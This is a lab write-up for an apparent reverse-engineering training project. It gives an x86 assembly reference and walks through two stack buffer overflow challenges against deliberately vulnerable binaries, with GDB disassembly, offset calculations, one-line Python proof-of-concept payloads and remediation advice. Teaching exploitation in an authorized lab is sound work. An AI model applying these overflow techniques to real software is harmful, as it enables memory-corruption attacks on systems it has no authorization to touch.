# Hole-In-Bin

## Introduction

Hole-In-Bin is a hands-on learning project focused on reverse engineering
and binary exploitation. The project provides a set of vulnerable binaries
designed to develop a practical understanding of low-level system mechanics,
memory corruption, and common binary vulnerabilities.

## Objectives

- Understand x86 assembly and low-level program execution.
- Analyze stack and heap memory.
- Understand stack frames and memory layouts.
- Identify and analyze different binary vulnerabilities.
- Understand buffer overflow and format string vulnerabilities.
- Practice debugging and binary analysis using GDB/PEDA.
- Develop practical binary exploitation skills in an authorized lab environment.

## Tools

- GDB / PEDA
- Ghidra (Listing View only)
- Radare2
- Python

## x86 Assembly Quick Reference

### General-Purpose Registers

| Register | Common Usage |
|----------|--------------|
| `EAX` | Arithmetic operations, temporary values, and function return values |
| `EBX` | General-purpose register, commonly used to preserve values |
| `ECX` | Counter register, commonly used in loops and string operations |
| `EDX` | General-purpose register; also used with `EAX` for multiplication and division |
| `ESI` | Source index, commonly used for memory and string operations |
| `EDI` | Destination index, commonly used for memory and string operations |
| `EBP` | Base pointer used to reference the current stack frame |
| `ESP` | Stack pointer; points to the current top of the stack |
| `EIP` | Instruction pointer; contains the address of the next instruction to execute |
| `EFLAGS` | Contains CPU status flags such as Zero, Carry, Sign, and Overflow |

### Important Instructions

| Instruction | Description |
|-------------|-------------|
| `mov` | Copies data from a source to a destination |
| `lea` | Loads the effective address of a memory operand |
| `push` | Places a value onto the stack |
| `pop` | Removes a value from the stack |
| `add` | Performs addition |
| `sub` | Performs subtraction |
| `inc` | Increments a value by one |
| `dec` | Decrements a value by one |
| `cmp` | Compares two values and updates the CPU flags |
| `test` | Performs a bitwise AND and updates the CPU flags |
| `jmp` | Performs an unconditional jump |
| `je` / `jz` | Jumps when the Zero Flag is set |
| `jne` / `jnz` | Jumps when the Zero Flag is not set |
| `call` | Calls a function and saves the return address |
| `ret` | Returns from a function using the saved return address |
| `leave` | Restores the previous stack frame |
| `and` | Performs a bitwise AND operation |
| `or` | Performs a bitwise OR operation |
| `xor` | Performs a bitwise XOR operation |
| `imul` | Performs signed multiplication |
| `idiv` | Performs signed division |
| `nop` | Performs no operation and moves to the next instruction |


### argc / argv — 32-bit x86

| Stack offset | Meaning | Size |
|---|---|---|
| `[ebp+0x8]` | `argc` | 4 bytes |
| `[ebp+0xc]` | `argv` | 4 bytes |
| `argv + 0x0` | `argv[0]` | 4 bytes |
| `argv + 0x4` | `argv[1]` | 4 bytes |
| `argv + 0x8` | `argv[2]` | 4 bytes |
| `argv + 0xc` | `argv[3]` | 4 bytes |

**Why `0x4`?**

On 32-bit x86, a pointer is **4 bytes**, so each `argv[i]` entry occupies 4 bytes.

For example:

```asm
mov eax, [ebp+0xc]    ; eax = argv
add eax, 0x4          ; eax = &argv[1]
mov eax, [eax]        ; eax = argv[1]
````

# Challenges

## ex00 - Stack Buffer Overflow

#### Objective

Modify the `modified` variable to reach the target success message:

> `you have changed the 'modified' variable`

---

#### Analysis

Analyzing the `main` function disassembly using **GDB/PEDA**:

```assembly
gdb-peda$ pdisass main

0x080483f4 <+0>:     push   ebp
0x080483f5 <+1>:     mov    ebp,esp
0x080483f7 <+3>:     and    esp,0xfffffff0
0x080483fa <+6>:     sub    esp,0x60
0x080483fd <+9>:     mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <+17>:    lea    eax,[esp+0x1c]
0x08048409 <+21>:    mov    DWORD PTR [esp],eax
0x0804840c <+24>:    call   gets@plt
0x08048411 <+29>:    mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <+33>:    test   eax,eax
0x08048417 <+35>:    je     0x8048427
```

**Key Layout Observations:**

* Stack frame allocation: `sub esp, 0x60`
* Input buffer start address: `esp + 0x1c`
* Target variable (`modified`) location: `esp + 0x5c`

---

#### Vulnerability

The program uses the unsafe function `gets()` (`call gets@plt`). Because `gets()` performs no bounds checking on input length, an attacker can write past the allocated buffer boundary and overwrite adjacent stack variables.

---

#### Exploitation

**Offset Calculation:**

```text
0x5c - 0x1c = 0x40 = 64 bytes
```

**Proof of Concept (PoC):**

```bash
python -c 'print "A" * 64 + "B"' | ./bin
```

**Result:**

```bash
user@hole-in-bin:/opt/hole-in-bin/ex00$ python -c 'print "A" * 64 + "B"' | ./bin
you have changed the 'modified' variable
user@hole-in-bin:/opt/hole-in-bin/ex00$ 
```

The 64-byte padding fills the space between the start of the buffer and the `modified` variable. The subsequent non-zero byte (`B`) overwrites `modified`, satisfying the validation check (`test eax, eax`) and triggering the success message.


#### Key Takeaway

This challenge demonstrates how an unchecked memory write can overwrite
a neighboring stack variable. The vulnerability can be analyzed by
understanding the stack layout and calculating the distance between
the input buffer and the target variable.

---

#### Remediation

1. **Use Bounded Functions:** Replace the unsafe `gets()` function with a safe input function:
```c
fgets(buffer, sizeof(buffer), stdin);
```
---

## ex01 - Stack Buffer Overflow

#### Objective

Modify the `modified` variable to hold the specific hexadecimal value:

```bash
0x61626364
```

The challenge is successfully completed when the program outputs:

> `you have correctly got the variable to the right value`

---

#### Analysis

Analyzing the `main` function disassembly using **GDB/PEDA**:

```assembly
gdb-peda$ pd main

0x08048464 <+0>:     push   ebp
0x08048465 <+1>:     mov    ebp,esp
0x08048467 <+3>:     and    esp,0xfffffff0
0x0804846a <+6>:     sub    esp,0x60

0x0804846d <+9>:     cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <+13>:    jne    0x8048487 <main+35>

0x08048487 <+35>:    mov    DWORD PTR [esp+0x5c],0x0

0x0804848f <+43>:    mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <+46>:    add    eax,0x4
0x08048495 <+49>:    mov    eax,DWORD PTR [eax]

0x08048497 <+51>:    mov    DWORD PTR [esp+0x4],eax
0x0804849b <+55>:    lea    eax,[esp+0x1c]
0x0804849f <+59>:    mov    DWORD PTR [esp],eax
0x080484a2 <+62>:    call   0x8048368 <strcpy@plt>

0x080484a7 <+67>:    mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <+71>:    cmp    eax,0x61626364
```

**Stack Layout Observations:**

* Destination buffer start: `esp + 0x1c`
* Target variable (`modified`) location: `esp + 0x5c`

**Offset Calculation:**

```text
0x5c - 0x1c = 0x40 = 64 bytes
```

---

#### Vulnerability

The application uses `strcpy()` (`call 0x8048368 <strcpy@plt>`) to copy user input from `argv[1]` into the fixed-size buffer at `esp + 0x1c`. Because `strcpy()` performs no length validation, supplying a string longer than 64 bytes overflows the destination buffer and directly overwrites the adjacent `modified` variable on the stack.

---

#### Exploitation

**Target Value:** `0x61626364`

Because the binary runs on an x86 architecture (**Little-Endian** byte ordering), the bytes must be supplied in reverse order:

```text
\x64 \x63 \x62 \x61  --->  "dcba"
```

**Payload Structure:**

```text
[ 64 Bytes Padding ] + [ "dcba" ]
```

**Proof of Concept (PoC):**

```bash
./bin $(python -c 'print "A" * 64 + "dcba"') 
```

**Result:**

```text
    you have correctly got the variable to the right value
```

The first 64 bytes pad the space from the start of the buffer up to `modified`. The trailing `"dcba"` overwrites `modified` with `0x61626364`, satisfying the comparison check (`cmp eax, 0x61626364`).


#### Key Takeaway

This challenge demonstrates how a stack buffer overflow can be used
to overwrite a variable with a specific value. The required value must
be represented according to the target architecture's byte ordering.


---

#### Remediation

 **Avoid Unsafe Copy Operations:** Replace `strcpy()` with bounded functions that enforce destination buffer limits, such as `strncpy()` or `snprintf()`:
```c
snprintf(buffer, sizeof(buffer), "%s", input);
```